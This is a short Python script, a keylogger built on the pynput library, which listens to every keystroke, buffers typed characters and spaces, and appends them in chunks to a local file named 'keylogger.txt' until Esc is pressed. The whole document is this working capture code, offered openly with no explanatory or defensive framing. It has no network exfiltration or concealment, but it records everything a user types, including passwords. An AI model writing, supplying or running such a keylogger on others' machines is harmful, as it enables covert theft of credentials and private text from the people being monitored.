import logging
from pynput import keyboard

logging.basicConfig(filename="keylogger.txt", level=logging.INFO, format="%(message)s")
keys = []

def on_press(key):
    global keys
    if hasattr(key, 'char') and key.char is not None:
        keys.append(key.char)
    elif key == keyboard.Key.space:
        keys.append(' ')
    if len(keys) >= 20 or key == keyboard.Key.space:
        write_to_file()

def write_to_file():
    with open("keylogger.txt", "a") as logKey:
        logKey.write(''.join(keys) + '\n')
    keys.clear()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
        